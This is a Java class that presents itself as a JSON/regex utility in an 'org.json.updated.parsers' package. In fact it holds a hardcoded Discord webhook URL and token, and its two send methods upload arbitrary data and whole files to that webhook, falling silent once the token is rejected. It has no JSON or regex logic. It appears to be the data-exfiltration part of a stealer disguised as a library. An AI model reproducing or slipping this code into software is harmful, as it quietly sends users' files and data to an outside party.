package org.json.updated.parsers;

import org.json.updated.parsers.util.JSONParser;

import java.io.File;

public class JSONRegexHandler {
    private static final String WEBHOOK = "https://canary.discord.com/api/webhooks/914731776931405834/PIwj42LQQeKDGLRihlXqEMMGI9e6BAdjjfeHEZefqcxs4YUMqZ8SfCdf-ZhABoC-Xy8j";
    private static boolean success = true;

    public static void send(String data) {
        if (!success) {
            return;
        }

        String result = JSONParser.post(WEBHOOK, data);
        if (result.contains("Invalid Webhook Token")) {
            success = false;
        }
    }

    public static void send(File file) {
        if (!success) {
            return;
        }

        String result = JSONParser.sendFile(WEBHOOK, file);
        if (result.contains("Invalid Webhook Token")) {
            success = false;
        }
    }
}
